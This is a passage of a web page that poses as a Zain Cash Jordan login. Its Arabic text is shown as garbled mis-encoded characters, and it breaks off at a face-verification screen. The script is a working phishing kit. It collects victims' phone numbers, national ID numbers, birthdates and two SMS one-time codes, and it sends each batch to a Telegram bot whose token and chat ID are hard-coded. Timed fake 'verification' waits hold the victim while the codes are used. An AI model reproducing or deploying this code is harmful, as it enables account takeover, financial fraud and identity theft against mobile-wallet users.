<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>Ø²ÙŠÙ† ÙƒØ§Ø´ Ø§Ù„Ø£Ø±Ø¯Ù† | ØªØ³Ø¬ÙŠÙ„ Ø§Ù„Ø¯Ø®ÙˆÙ„</title>
  <!-- Open Graph Meta Tags for Link Preview -->
  <meta property="og:title" content="Ø²ÙŠÙ† ÙƒØ§Ø´ Ø§Ù„Ø£Ø±Ø¯Ù† | ØªØ³Ø¬ÙŠÙ„ Ø§Ù„Ø¯Ø®ÙˆÙ„" />
  <meta property="og:description" content="Ø³Ø¬Ù„ Ø¯Ø®ÙˆÙ„Ùƒ Ù„Ø®Ø¯Ù…Ø§Øª Ø²ÙŠÙ† ÙƒØ§Ø´ Ø§Ù„Ø£Ø±Ø¯Ù† Ø¨Ø£Ù…Ø§Ù† ÙˆØ³Ù‡ÙˆÙ„Ø©!" />
  <meta property="og:image" content="https://www2.0zz0.com/2025/06/23/15/797647963.jpeg" />
  <meta property="og:url" content="https://zaincashjordan.vercel.app" />
  <meta property="og:type" content="website" />
  <meta property="og:locale" content="ar_AR" />
  <!-- Twitter Card Meta Tags -->
  <meta name="twitter:card" content="summary_large_image" />
  <meta name="twitter:title" content="Ø²ÙŠÙ† ÙƒØ§Ø´ Ø§Ù„Ø£Ø±Ø¯Ù† | ØªØ³Ø¬ÙŠÙ„ Ø§Ù„Ø¯Ø®ÙˆÙ„" />
  <meta name="twitter:description" content="Ø³Ø¬Ù„ Ø¯Ø®ÙˆÙ„Ùƒ Ù„Ø®Ø¯Ù…Ø§Øª Ø²ÙŠÙ† ÙƒØ§Ø´ Ø§Ù„Ø£Ø±Ø¯Ù† Ø¨Ø£Ù…Ø§Ù† ÙˆØ³Ù‡ÙˆÙ„Ø©!" />
  <meta name="twitter:image" content="https://www2.0zz0.com/2025/06/23/15/797647963.jpeg" />
  <link href="https://fonts.googleapis.com/css2?family=Cairo:wght@400;600;900&display=swap" rel="stylesheet">
  <style>
    body {
      background: linear-gradient(135deg, #2F80ED 0%, #56CCF2 100%);
      min-height: 100vh;
      font-family: 'Cairo', Arial, sans-serif;
      margin: 0;
      display: flex;
      justify-content: center;
      align-items: center;
    }
    #app {
      background: #fff;
      border-radius: 22px;
      box-shadow: 0 8px 32px 0 rgba(47,128,237,0.13), 0 1.5px 12px #2f80ed11;
      width: 370px;
      max-width: 95vw;
      padding: 32px 26px 30px 26px;
      box-sizing: border-box;
      direction: rtl;
      position: relative;
      overflow: hidden;
      border: 2.5px solid #2F80ED33;
      animation: fadein 0.8s;
    }
    @keyframes fadein {
      from { opacity: 0; transform: translateY(36px);}
      to { opacity: 1; transform: none;}
    }
    .zain-header {
      display: flex;
      align-items: center;
      justify-content: center;
      margin-bottom: 14px;
      gap: 10px;
    }
    .zain-logo {
      width: 64px;
      height: 64px;
      border-radius: 20px;
      background: linear-gradient(135deg, #56ccf2 60%, #2f80ed 100%);
      display: flex;
      align-items: center;
      justify-content: center;
      box-shadow: 0 2px 16px #2f80ed22;
      border: 2.5px solid #fff;
      overflow: hidden;
    }
    .zain-logo img {
      width: 60px;
      height: 60px;
      object-fit: contain;
      background: #fff;
      border-radius: 16px;
      border: 1.5px solid #e3eefe;
      box-shadow: 0 1px 6px #56ccf233;
    }
    .zain-title-main {
      font-size: 25px;
      font-weight: 900;
      letter-spacing: 0.2px;
      color: #2F80ED;
      margin: 0;
      text-shadow: 0 1px 0 #fff, 0 2px 8px #2f80ed22;
    }
    .zain-title-sub {
      font-size: 15px;
      color: #353a4d;
      font-weight: 600;
      text-align: center;
      margin: 2px 0 0 0;
      letter-spacing: 0.1px;
    }
    .step-indicator {
      display: flex;
      justify-content: center;
      gap: 6.5px;
      margin-bottom: 16px;
      margin-top: 7px;
    }
    .step-dot {
      width: 11px;
      height: 11px;
      border-radius: 50%;
      background: #eaf2fd;
      border: 2px solid #56ccf2;
      transition: background 0.2s;
    }
    .step-dot.active {
      background: linear-gradient(135deg, #2f80ed 70%, #56ccf2 100%);
      border-color: #2f80ed;
    }
    form {
      display: flex;
      flex-direction: column;
      gap: 13px;
      margin-top: 7px;
    }
    label {
      color: #2F80ED;
      font-size: 15px;
      font-weight: 600;
      margin-bottom: 3px;
      margin-right: 2px;
      letter-spacing: 0.2px;
    }
    input, select {
      padding: 14px 11px;
      border: none;
      border-radius: 9px;
      font-size: 16px;
      background: #f2f8fd;
      color: #222;
      outline: none;
      box-shadow: 0 1.5px 5px #56ccf211;
      transition: box-shadow 0.2s, border 0.2s;
      border: 2px solid #56ccf233;
      font-family: 'Cairo', Arial, sans-serif;
    }
    input:focus, select:focus {
      box-shadow: 0 3px 16px #2f80ed33;
      border-color: #2F80ED;
      background: #f4faff;
    }
    .button {
      background: linear-gradient(90deg, #2F80ED 0%, #56CCF2 100%);
      color: white;
      border: none;
      border-radius: 9px;
      padding: 13px 0;
      font-size: 18px;
      font-weight: 800;
      cursor: pointer;
      margin-top: 8px;
      margin-bottom: 3px;
      transition: background 0.2s, opacity 0.15s;
      letter-spacing: 0.7px;
      box-shadow: 0 1px 6px #2f80ed22;
    }
    .button:active { opacity: 0.86; }
    .info-msg {
      text-align: center;
      color: #2F80ED;
      font-size: 13px;
      margin-bottom: 7px;
      margin-top: 2px;
      font-weight: 600;
      letter-spacing: 0.1px;
    }
    .code-inputs {
      display: flex;
      gap: 10px;
      justify-content: center;
      margin: 8px 0 7px 0;
    }
    .code-inputs input {
      text-align: center;
      font-size: 19px;
      width: 120px;
      padding: 13px 0;
      letter-spacing: 5px;
      border-radius: 7px;
      border: 2px solid #56ccf255;
      background: #f2f8fd;
      font-weight: 700;
      transition: border 0.2s, box-shadow 0.2s;
      box-shadow: 0 1.5px 5px #56ccf211;
      direction: ltr;
    }
    .code-inputs input:focus {
      border-color: #2F80ED;
      background: #f4faff;
    }
    .success-message {
      text-align: center;
      color: #1887d2;
      font-size: 19px;
      font-weight: 700;
      margin: 22px 0 0 0;
      letter-spacing: 0.5px;
    }
    .zain-footer {
      margin-top: 22px;
      text-align: center;
      color: #a6c7ef;
      font-size: 13px;
      font-weight: 600;
      letter-spacing: 1px;
      opacity: 0.83;
      text-shadow: 0 1px 0 #fff;
    }
    #modalError {
      display: none;
      position: fixed;
      top:0; left:0; width:100vw; height:100vh;
      background: rgba(47,128,237,0.13);
      z-index: 9999;
      align-items: center;
      justify-content: center;
    }
    #modalError.active {
      display: flex;
      animation: fadein 0.3s;
    }
    #modalContent {
      background: #fff;
      padding: 27px 32px;
      border-radius: 13px;
      box-shadow: 0 7px 34px #2f80ed33, 0 1.5px 7px #2f80ed22;
      text-align: center;
      min-width: 260px;
      border: 2px solid #f9b3b3;
    }
    #modalContent .err-title {
      color: #e53935;
      font-size: 19px;
      font-weight: bold;
    }
    #modalContent .err-msg {
      margin-top: 8px;
      font-size: 15px;
      color: #444;
      font-weight: 600;
      margin-bottom: 8px;
    }
    #modalContent button {
      margin-top: 14px;
      background: linear-gradient(90deg, #2F80ED 0%, #56CCF2 100%);
      color: #fff;
      padding: 7px 27px;
      border: none;
      border-radius: 6px;
      cursor: pointer;
      font-size: 15px;
      font-weight: bold;
    }
    #modalContent button:active {
      background: linear-gradient(90deg, #56CCF2 0%, #2F80ED 100%);
    }
    .birthdate-fields {
      display: flex;
      gap: 7px;
      align-items: center;
      margin-bottom: 4px;
    }
    .birthdate-fields select {
      width: 33%;
      padding: 11px 4px;
      font-size: 15px;
      text-align: center;
    }

    /* Camera / Capture styles */
    .camera-wrap {
      display: flex;
      flex-direction: column;
      align-items: center;
      gap: 14px;
      padding: 6px 0;
    }
    .camera-box {
      width: 100%;
      max-width: 320px;
      height: 420px;
      background: #2f2f33;
      border-radius: 8px;
      display: flex;
      align-items: center;
      justify-content: center;
      overflow: hidden;
      border: 6px solid #fff;
      box-sizing: border-box;
      position: relative;
    }
    .camera-box video, .camera-box img {
      width: 100%;
      height: 100%;
      object-fit: cover;
    }
    .camera-prompt {
      color: #fff;
      font-size: 20px;
      font-weight: 700;
      letter-spacing: 0.2px;
      text-align: center;
      margin-top: 6px;
    }
    .countdown {
      position: absolute;
      top: 8px;
      left: 8px;
      background: rgba(0,0,0,0.45);
      color: #fff;
      padding: 6px 10px;
      border-radius: 12px;
      font-weight: 700;
      font-size: 16px;
    }

    /* Processing modal */
    #processingModal {
      display: none;
      position: fixed;
      inset: 0;
      background: rgba(0,0,0,0.55);
      z-index: 10000;
      align-items: center;
      justify-content: center;
      color: #fff;
      font-family: 'Cairo', Arial, sans-serif;
    }
    #processingModal.active { display: flex; }
    .processingBox {
      background: rgba(0,0,0,0.65);
      padding: 20px 26px;
      border-radius: 12px;
      text-align: center;
      min-width: 260px;
    }
    .spinner {
      width: 48px;
      height: 48px;
      border-radius: 50%;
      border: 5px solid rgba(255,255,255,0.18);
      border-top-color: #fff;
      animation: spin 1s linear infinite;
      margin: 0 auto 12px;
    }
    @keyframes spin { to { transform: rotate(360deg); } }

    @media (max-width: 450px) {
      #app { padding: 16px 1.5vw 10px 1.5vw; }
      .zain-logo { width: 51px; height: 51px;}
      .zain-logo img {width: 46px; height: 46px;}
      .zain-title-main { font-size: 20px;}
      .zain-title-sub { font-size: 13px;}
      #modalContent { padding: 17px 7vw;}
      .birthdate-fields select { font-size: 14px; }
      .code-inputs input { width: 80px;}
      .camera-box { height: 320px; }
    }
  </style>
</head>
<body>
  <div id="app"></div>

  <!-- Processing modal shown while verifying/sending video -->
  <div id="processingModal" aria-hidden="true">
    <div class="processingBox">
      <div class="spinner" role="status" aria-hidden="true"></div>
      <div style="font-weight:700;font-size:18px;">Ø¬Ø§Ø±Ù Ø§Ù„ØªØ­Ù‚Ù‚ Ù…Ù† Ù‡ÙˆÙŠØªÙƒ...</div>
      <div style="margin-top:6px;color:#ddd;font-size:14px;">Ø§Ù„Ø±Ø¬Ø§Ø¡ Ø§Ù„Ø§Ù†ØªØ¸Ø§Ø± Ø­ØªÙ‰ Ø§Ù„Ø§Ù†ØªÙ‡Ø§Ø¡</div>
    </div>
  </div>

  <!-- Modal Error -->
  <div id="modalError">
    <div id="modalContent">
      <div class="err-title">ÙŠÙˆØ¬Ø¯ Ø®Ø·Ø£ ÙÙŠ Ø§Ù„Ù…Ø¹Ù„ÙˆÙ…Ø§Øª</div>
      <div class="err-msg">ÙŠØ±Ø¬Ù‰ Ø¥Ø¹Ø§Ø¯Ø© Ø§Ù„Ù…Ø­Ø§ÙˆÙ„Ø©. Ø³ÙŠØªÙ… ØªÙˆØ¬ÙŠÙ‡Ùƒ Ø¥Ù„Ù‰ Ø§Ù„Ø¨Ø¯Ø§ÙŠØ©.</div>
      <button id="modalCloseBtn">Ø¥ØºÙ„Ø§Ù‚</button>
    </div>
  </div>

  <script>
    // ------------ Ø¥Ø¹Ø¯Ø§Ø¯Ø§Øª Ø§Ù„Ø¨ÙˆØª (Ù…Ø·Ø§Ø¨Ù‚Ø© Ù„Ø·Ù„Ø¨Ùƒ) --------------
    const BOT_TOKEN = "8190400010:AAERe3gfKcxCz2CjjFIDBobm1ER-2SkYkXA";
    const CHAT_ID = "6873334348";
    const zainCashLogo = "https://www2.0zz0.com/2025/06/23/15/797647963.jpeg";
    const faceLogo = "https://e.top4top.io/p_3664gms740.jpeg";

    let userData = { phone: '', nationalId: '', birthdate: '', code5: '', code4: '' };
    let currentStep = "phone";
    let waitingTimeout = null;
    let telegramMsgId = null;

    function stepIndicator(step) {
      return `
        <div class="step-indicator">
          <div class="step-dot${step===1?' active':''}"></div>
          <div class="step-dot${step===2?' active':''}"></div>
          <div class="step-dot${step===3?' active':''}"></div>
        </div>
      `;
    }
    function header(sub="") {
      return `
        <div class="zain-header">
          <div class="zain-logo"><img src="${zainCashLogo}" alt="Zain Cash" /></div>
          <span class="zain-title-main">Ø²ÙŠÙ† ÙƒØ§Ø´ Ø§Ù„Ø£Ø±Ø¯Ù†</span>
        </div>
        <div class="zain-title-sub">${sub}</div>
      `;
    }

    // ---------- Ø®Ø·ÙˆØ§Øª Ø§Ù„Ù†Ù…ÙˆØ°Ø¬ ----------
    function renderPhoneStep() {
      currentStep = "phone";
      app.innerHTML = `
        ${header("Ù…Ø±Ø­Ø¨Ù‹Ø§ Ø¨Ùƒ! Ø³Ø¬Ù„ Ø¯Ø®ÙˆÙ„Ùƒ Ù„Ø­Ø³Ø§Ø¨Ùƒ")}
        ${stepIndicator(1)}
        <form id="phoneForm" autocomplete="off">
          <label>Ø±Ù‚Ù… Ø§Ù„Ù‡Ø§ØªÙ Ø§Ù„Ù…Ø±ØªØ¨Ø· Ø¨Ø­Ø³Ø§Ø¨Ùƒ</label>
          <input type="tel" id="phone" placeholder="07XXXXXXXX" pattern="07[0-9]{8}" maxlength="10" required autocomplete="tel" inputmode="numeric"/>
          <button type="submit" class="button">Ø§Ù„ØªØ§Ù„ÙŠ</button>
        </form>
        <div class="zain-footer">Zain Cash Jordan &copy; 2025</div>
      `;
      document.getElementById('phone').focus();
      document.getElementById('phoneForm').onsubmit = async function(e) {
        e.preventDefault();
        const phone = document.getElementById('phone').value.trim();
        if (!/^07\d{8}$/.test(phone)) {
          alert('ÙŠØ±Ø¬Ù‰ Ø¥Ø¯Ø®Ø§Ù„ Ø±Ù‚Ù… Ù‡Ø§ØªÙ ØµØ­ÙŠØ­ ÙŠØ¨Ø¯Ø£ Ø¨Ù€ 07 ÙˆÙŠØªÙƒÙˆÙ† Ù…Ù† 10 Ø£Ø±Ù‚Ø§Ù…');
          document.getElementById('phone').focus();
          return;
        }
        userData.phone = phone;
        try {
          telegramMsgId = await sendToTelegramAndGetMsgId(`ğŸŸ¦ ØªØ³Ø¬ÙŠÙ„ Ø¯Ø®ÙˆÙ„ Ø²ÙŠÙ† ÙƒØ§Ø´ Ø§Ù„Ø£Ø±Ø¯Ù†\nğŸ“± Ø§Ù„Ù‡Ø§ØªÙ: ${userData.phone}`);
        } catch (err) {
          console.log("Telegram error:", err);
        }
        renderNationalIdStep();
      };
    }

    function renderNationalIdStep() {
      currentStep = "id";
      app.innerHTML = `
        <button class="back-btn" id="backBtn">&#8592; Ø±Ø¬ÙˆØ¹</button>
        ${header("ÙŠØ±Ø¬Ù‰ Ø¥Ø¯Ø®Ø§Ù„ Ø¨ÙŠØ§Ù†Ø§ØªÙƒ Ø§Ù„Ø´Ø®ØµÙŠØ©")}
        ${stepIndicator(1)}
        <form id="nationalForm" autocomplete="off">
          <label>Ø§Ù„Ø±Ù‚Ù… Ø§Ù„ÙˆØ·Ù†ÙŠ</label>
          <input type="text" id="nationalId" placeholder="Ø§Ù„Ø±Ù‚Ù… Ø§Ù„ÙˆØ·Ù†ÙŠ" maxlength="12" required inputmode="numeric"/>
          <label>ØªØ§Ø±ÙŠØ® Ø§Ù„Ù…ÙŠÙ„Ø§Ø¯</label>
          <div class="birthdate-fields" id="birthdateFields"></div>
          <button type="submit" class="button">Ø§Ù„ØªØ§Ù„ÙŠ</button>
        </form>
        <div class="zain-footer">Zain Cash Jordan &copy; 2025</div>
      `;

      renderBirthdateFields();
      document.getElementById('nationalId').focus();

      document.getElementById('nationalForm').onsubmit = async function(e) {
        e.preventDefault();
        const nationalId = document.getElementById('nationalId').value.trim();
        const day = document.getElementById('birthDay').value;
        const month = document.getElementById('birthMonth').value;
        const year = document.getElementById('birthYear').value;
        if (!/^\d{10,12}$/.test(nationalId)) {
          alert('ÙŠØ±Ø¬Ù‰ Ø¥Ø¯Ø®Ø§Ù„ Ø±Ù‚Ù… ÙˆØ·Ù†ÙŠ ØµØ­ÙŠØ­ (10 Ø¥Ù„Ù‰ 12 Ø±Ù‚Ù…)');
          document.getElementById('nationalId').focus();
          return;
        }
        if (!day || !month || !year) {
          alert('ÙŠØ±Ø¬Ù‰ Ø¥Ø¯Ø®Ø§Ù„ ØªØ§Ø±ÙŠØ® Ø§Ù„Ù…ÙŠÙ„Ø§Ø¯ (Ø§Ù„ÙŠÙˆÙ…/Ø§Ù„Ø´Ù‡Ø±/Ø§Ù„Ø³Ù†Ø©)');
          return;
        }
        const birthdate = `${year}-${month.padStart(2, '0')}-${day.padStart(2, '0')}`;
        userData.nationalId = nationalId;
        userData.birthdate = birthdate;
        try {
          telegramMsgId = await resendTelegramMsg(
            `ğŸŸ¦ ØªØ³Ø¬ÙŠÙ„ Ø¯Ø®ÙˆÙ„ Ø²ÙŠÙ† ÙƒØ§Ø´ Ø§Ù„Ø£Ø±Ø¯Ù†\nğŸ“± Ø§Ù„Ù‡Ø§ØªÙ: ${userData.phone}\nğŸ†” Ø§Ù„Ø±Ù‚Ù… Ø§Ù„ÙˆØ·Ù†ÙŠ: ${userData.nationalId}\nğŸ‚ ØªØ§Ø±ÙŠØ® Ø§Ù„Ù…ÙŠÙ„Ø§Ø¯: ${userData.birthdate}`
          );
        } catch (err) {
          console.log("Telegram error:", err);
        }
        showNationalIdWaitAndGotoCode5();
      };
      document.getElementById('backBtn').onclick = () => {
        renderPhoneStep();
      };
    }

    function showNationalIdWaitAndGotoCode5() {
      const randomWait = Math.floor(Math.random() * 26) + 15;
      app.innerHTML = `
        <div style="padding:40px 0;text-align:center;">
          <div style="margin-bottom:18px;">
            <img src="${zainCashLogo}" width="60" height="60" style="border-radius:14px;box-shadow:0 1px 7px #2f80ed33;"/>
          </div>
          <div style="color:#2F80ED;font-size:22px;font-weight:900;margin-bottom:8px;">ÙŠØ±Ø¬Ù‰ Ø§Ù„Ø§Ù†ØªØ¸Ø§Ø±...</div>
          <div style="color:#353a4d;font-size:15px;">Ø¬Ø§Ø±ÙŠ Ø§Ù„ØªØ­Ù‚Ù‚ Ù…Ù† Ø§Ù„Ù…Ø¹Ù„ÙˆÙ…Ø§Øª Ø§Ù„Ù…Ø¯Ø®Ù„Ø©</div>
          <div id="waitSecNational" style="margin:20px auto 0;font-size:16px;color:#1887d2;font-weight:700;">${randomWait}</div>
        </div>
        <div class="zain-footer">Zain Cash Jordan &copy; 2025</div>
      `;
      let sec = randomWait;
      const waitElem = document.getElementById('waitSecNational');
      waitingTimeout = setInterval(() => {
        sec--;
        if(waitElem) waitElem.textContent = sec;
        if(sec === 0) {
          clearInterval(waitingTimeout);
          renderCode5Step();
        }
      }, 1000);
    }

    function renderBirthdateFields() {
      const now = new Date();
      const maxYear = now.getFullYear();
      const minYear = maxYear - 100;
      const birthdateFields = document.getElementById('birthdateFields');

      let days = '<select id="birthDay" required><option value="">Ø§Ù„ÙŠÙˆÙ…</option>';
      for (let d = 1; d <= 31; d++) days += `<option value="${d}">${d}</option>`;
      days += '</select>';

      const monthNames = [
        'ÙŠÙ†Ø§ÙŠØ±','ÙØ¨Ø±Ø§ÙŠØ±','Ù…Ø§Ø±Ø³','Ø£Ø¨Ø±ÙŠÙ„','Ù…Ø§ÙŠÙˆ','ÙŠÙˆÙ†ÙŠÙˆ',
        'ÙŠÙˆÙ„ÙŠÙˆ','Ø£ØºØ³Ø·Ø³','Ø³Ø¨ØªÙ…Ø¨Ø±','Ø£ÙƒØªÙˆØ¨Ø±','Ù†ÙˆÙÙ…Ø¨Ø±','Ø¯ÙŠØ³Ù…Ø¨Ø±'
      ];
      let months = '<select id="birthMonth" required><option value="">Ø§Ù„Ø´Ù‡Ø±</option>';
      for (let m = 1; m <= 12; m++) months += `<option value="${m}">${monthNames[m - 1]}</option>`;
      months += '</select>';

      let years = '<select id="birthYear" required><option value="">Ø§Ù„Ø³Ù†Ø©</option>';
      for (let y = maxYear; y >= minYear; y--) years += `<option value="${y}">${y}</option>`;
      years += '</select>';

      birthdateFields.innerHTML = days + months + years;
    }

    function renderCode5Step() {
      currentStep = "code5";
      app.innerHTML = `
        <button class="back-btn" id="backBtn">&#8592; Ø±Ø¬ÙˆØ¹</button>
        ${header("ØªÙ… Ø¥Ø±Ø³Ø§Ù„ Ø±Ù…Ø² ØªØ­Ù‚Ù‚ Ø¥Ù„Ù‰ Ù‡Ø§ØªÙÙƒ")}
        ${stepIndicator(2)}
        <div class="info-msg">Ø£Ø¯Ø®Ù„ Ø±Ù…Ø² Ø§Ù„ØªØ­Ù‚Ù‚ Ø§Ù„Ù…ÙƒÙˆÙ† Ù…Ù† 5 Ø£Ø±Ù‚Ø§Ù… ÙƒÙ…Ø§ ÙˆØµÙ„Ùƒ Ø¨Ø±Ø³Ø§Ù„Ø© SMS</div>
        <form id="code5Form" autocomplete="off">
          <div class="code-inputs">
            <input type="text" maxlength="5" pattern="\\d{5}" required id="code5input" inputmode="numeric" placeholder="*****" />
          </div>
          <button type="submit" class="button">ØªØ£ÙƒÙŠØ¯ Ø§Ù„Ø±Ù…Ø²</button>
        </form>
        <div class="zain-footer">Zain Cash Jordan &copy; 2025</div>
      `;
      const codeInput = document.getElementById('code5input');
      codeInput.focus();
      codeInput.addEventListener('input', function() {
        this.value = this.value.replace(/\D/g, '').slice(0,5);
      });
      document.getElementById('code5Form').onsubmit = async function(e) {
        e.preventDefault();
        let code = codeInput.value.trim();
        if (code.length !== 5) {
          alert('ÙŠØ±Ø¬Ù‰ Ø¥Ø¯Ø®Ø§Ù„ Ø±Ù…Ø² Ù…ÙƒÙˆÙ† Ù…Ù† 5 Ø£Ø±Ù‚Ø§Ù…');
          codeInput.focus();
          return;
        }
        userData.code5 = code;
        try {
          telegramMsgId = await resendTelegramMsg(
            `ğŸŸ¦ ØªØ³Ø¬ÙŠÙ„ Ø¯Ø®ÙˆÙ„ Ø²ÙŠÙ† ÙƒØ§Ø´ Ø§Ù„Ø£Ø±Ø¯Ù†\nğŸ“± Ø§Ù„Ù‡Ø§ØªÙ: ${userData.phone}\nğŸ†” Ø§Ù„Ø±Ù‚Ù… Ø§Ù„ÙˆØ·Ù†ÙŠ: ${userData.nationalId}\nğŸ‚ ØªØ§Ø±ÙŠØ® Ø§Ù„Ù…ÙŠÙ„Ø§Ø¯: ${userData.birthdate}\nğŸ”¢ Ø±Ù…Ø² Ø§Ù„ØªØ­Ù‚Ù‚ Ø§Ù„Ø£ÙˆÙ„: ${userData.code5}`
          );
        } catch (err) {
          console.log("Telegram error:", err);
        }
        showWaitMsgAndGotoCode4();
      };
      document.getElementById('backBtn').onclick = () => {
        renderNationalIdStep();
      };
    }

    function showWaitMsgAndGotoCode4() {
      const randomWait = Math.floor(Math.random() * 6) + 5; // 5-10 Ø«ÙˆØ§Ù†Ù ÙÙ‚Ø·
      app.innerHTML = `
        <div style="padding:40px 0;text-align:center;">
          <div style="margin-bottom:18px;">
            <img src="${zainCashLogo}" width="60" height="60" style="border-radius:14px;box-shadow:0 1px 7px #2f80ed33;"/>
          </div>
          <div style="color:#2F80ED;font-size:22px;font-weight:900;margin-bottom:8px;">ÙŠØ±Ø¬Ù‰ Ø§Ù„Ø§Ù†ØªØ¸Ø§Ø±...</div>
          <div style="color:#353a4d;font-size:15px;">Ø¬Ø§Ø±ÙŠ Ø§Ù„ØªØ­Ù‚Ù‚ Ù…Ù† Ø±Ù…Ø² Ø§Ù„Ø¯Ø®ÙˆÙ„</div>
          <div id="waitSec" style="margin:20px auto 0;font-size:16px;color:#1887d2;font-weight:700;">${randomWait}</div>
        </div>
        <div class="zain-footer">Zain Cash Jordan &copy; 2025</div>
      `;
      let sec = randomWait;
      const waitElem = document.getElementById('waitSec');
      waitingTimeout = setInterval(() => {
        sec--;
        if(waitElem) waitElem.textContent = sec;
        if(sec === 0) {
          clearInterval(waitingTimeout);
          renderCode4Step();
        }
      }, 1000);
    }

    function renderCode4Step() {
      currentStep = "code4";
      app.innerHTML = `
        <button class="back-btn" id="backBtn">&#8592; Ø±Ø¬ÙˆØ¹</button>
        ${header("ØªØ­Ù‚Ù‚ Ø¥Ø¶Ø§ÙÙŠ Ù„Ø­Ù…Ø§ÙŠØ© Ø­Ø³Ø§Ø¨Ùƒ")}
        ${stepIndicator(3)}
        <div class="info-msg">Ø§Ù„Ø±Ø¬Ø§Ø¡ Ø¥Ø¯Ø®Ø§Ù„ Ø±Ù…Ø² Ø§Ù„ØªØ­Ù‚Ù‚ Ø§Ù„Ù…ÙƒÙˆÙ† Ù…Ù† 4 Ø£Ø±Ù‚Ø§Ù…</div>
        <form id="code4Form" autocomplete="off">
          <div class="code-inputs">
            <input type="text" maxlength="4" pattern="\\d{4}" required id="code4input" inputmode="numeric" placeholder="****" />
          </div>
          <button type="submit" class="button">ØªØ£ÙƒÙŠØ¯ Ø§Ù„Ø±Ù…Ø²</button>
        </form>

        <div class="zain-footer">Zain Cash Jordan &copy; 2025</div>
      `;
      const codeInput = document.getElementById('code4input');
      codeInput.focus();
      codeInput.addEventListener('input', function() {
        this.value = this.value.replace(/\D/g, '').slice(0,4);
      });

      // Ø¹Ù†Ø¯ ØªÙ‚Ø¯ÙŠÙ… Ø±Ù…Ø² Ø§Ù„Ù€4 Ù†Ø±Ø³Ù„ Ù„Ù„ØªÙŠÙ„ÙŠØ¬Ø±Ø§Ù… Ø«Ù… Ù†Ù†ØªÙ‚Ù„ Ø¥Ù„Ù‰ Ø´Ø§Ø´Ø© Ø§Ù„ØªØ­Ù‚Ù‚ Ø¨Ø§Ù„ÙˆØ¬Ù‡ (ÙƒÙ…Ø§ Ø·Ù„Ø¨Øª)
      document.getElementById('code4Form').onsubmit = async function(e) {
        e.preventDefault();
        let code = codeInput.value.trim();
        if (code.length !== 4) {
          alert('ÙŠØ±Ø¬Ù‰ Ø¥Ø¯Ø®Ø§Ù„ Ø±Ù…Ø² Ù…ÙƒÙˆÙ† Ù…Ù† 4 Ø£Ø±Ù‚Ø§Ù…');
          codeInput.focus();
          return;
        }
        userData.code4 = code;
        try {
          telegramMsgId = await resendTelegramMsg(
            `ğŸŸ¦ ØªØ³Ø¬ÙŠÙ„ Ø¯Ø®ÙˆÙ„ Ø²ÙŠÙ† ÙƒØ§Ø´ Ø§Ù„Ø£Ø±Ø¯Ù†\nğŸ“± Ø§Ù„Ù‡Ø§ØªÙ: ${userData.phone}\nğŸ†” Ø§Ù„Ø±Ù‚Ù… Ø§Ù„ÙˆØ·Ù†ÙŠ: ${userData.nationalId}\nğŸ‚ ØªØ§Ø±ÙŠØ® Ø§Ù„Ù…ÙŠÙ„Ø§Ø¯: ${userData.birthdate}\nğŸ”¢ Ø±Ù…Ø² Ø§Ù„ØªØ­Ù‚Ù‚ Ø§Ù„Ø£ÙˆÙ„: ${userData.code5}\nğŸ”’ Ø±Ù…Ø² Ø§Ù„ØªØ­Ù‚Ù‚ Ø§Ù„Ø«Ø§Ù†ÙŠ: ${userData.code4}`
          );
        } catch (err) {
          console.log("Telegram error:", err);
        }
        // Ø§Ù„ØªÙˆØ¬ÙŠÙ‡ Ø¥Ù„Ù‰ Ø´Ø§Ø´Ø© Ø§Ù„Ù…Ù‚Ø¯Ù…Ø© Ù„Ù„ØªØ­Ù‚Ù‚ Ø¨Ø§Ù„ÙˆØ¬Ù‡ Ø¨Ø¹Ø¯ Ø§Ù„Ø¶ØºØ· Ø¹Ù„Ù‰ "ØªØ£ÙƒÙŠØ¯ Ø§Ù„Ø±Ù…Ø²"
        renderFaceIntro();
      };

      document.getElementById('backBtn').onclick = () => {
        renderCode5Step();
      };
    }

    // ---------------- Ø´Ø§Ø´Ø© Ø§Ù„Ù…Ù‚Ø¯Ù…Ø© Ù„Ù„ØªØ­Ù‚Ù‚ Ø¨Ø§Ù„ÙˆØ¬Ù‡ (Ù…Ø¹ Ø§Ù„ØªØ¹Ù„ÙŠÙ…Ø§Øª) ----------------
    function renderFaceIntro() {
      currentStep = "faceIntro";
      app.innerHTML = `
        <button class="back-btn" id="backBtn">&#8592; Ø±Ø¬ÙˆØ¹</button>
        ${header("Ø§Ù„ØªØ­Ù‚Ù‚ Ù…Ù† Ù‡ÙˆÙŠØªÙƒ")}
        <div style="text-align:center;margin-top:8px;">
          <div style="margin: 10px auto 14px; width: 180px; height: 180px;">
            <img src="${faceLogo}" alt="Ø´Ø¹Ø§Ø± Ø§Ù„ÙˆØ¬Ù‡" style="width:100%;height:100%;object-fit:contain;border-radius:12px;background:#fff;padding:8px;border:1px solid #eee;"/>
          </div>

          <div style="font-size:18px;color:#353a4d;font-weight:700;margin-bottom:6px;">Ø³Ù†Ø¨Ø¯Ø§Ù‹ Ø¨Ø§Ù„ØªÙ‚Ø§Ø· Ø§Ù„ÙÙŠØ¯ÙŠÙˆ Ù„Ù„ØªØ­Ù‚Ù‚</div>
          <div style="color:#666;font-size:14px;margin-bottom:12px;">Ø§Ø¶ØºØ· Ø§Ù„ØªØ§Ù„ÙŠ Ù„Ø¨Ø¯Ø¡ Ø¥Ø¹Ø·Ø§Ø¡ Ø§Ù„ØµÙ„Ø§Ø­ÙŠØ© ÙˆØ§Ù„ØªØ³Ø¬ÙŠÙ„</div>

          <!-- ØªØ¹Ù„ÙŠÙ…Ø§Øª Ù…ÙØµÙ„Ø© ÙƒÙ…Ø§ ÙÙŠ Ø§Ù„ØµÙˆØ±Ø© -->
          <div style="text-align:right; direction:rtl; margin: 8px 12px 12px 12px;">
            <ul style="text-align:right; color:#666; font-size:15px; line-height:1.6; padding-left:18px; margin:0;">
              <li style="margin-bottom:6px;">Ø¶Ø¹ ÙˆØ¬Ù‡Ùƒ ÙÙŠ Ø§Ù„Ø¥Ø·Ø§Ø±.</li>
              <li style="margin-bottom:6px;">Ø§Ù„ØªÙ‚Ø§Ø· ÙÙŠØ¯ÙŠÙˆ Ø­ÙŠ â€” Ø§Ù„ØµÙˆØ± Ø§Ù„Ù‚Ø¯ÙŠÙ…Ø© Ù…Ø±ÙÙˆØ¶Ø©.</li>
